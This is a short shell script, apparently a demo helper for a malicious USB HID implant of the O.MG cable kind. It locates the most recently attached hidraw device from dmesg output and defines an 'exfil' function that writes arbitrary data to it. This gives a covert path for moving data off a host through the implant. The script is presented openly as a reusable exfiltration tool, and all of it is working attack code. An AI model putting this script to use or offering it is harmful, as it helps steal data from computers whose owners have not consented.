#!/bin/sh
# Note: This uses base components to implement
# More advanced techniques are possible 
# but this is a simple demo to allow you to call exfil "data"
# and write it out

# wasabi

getOMGDev(){
	# not perfect but just looking for the last hid device we found
	devn=$(dmesg|grep hidraw|grep hiddev|grep input2|tail -n1|awk -F ',' '{print $2}'|awk -F ':' '{print $1}')
	echo $devn 
}

exfil(){
	IN="$1"
	OUT=$(getOMGDev)
	# thats it! 
	echo "${IN}" > "${OUT}"
}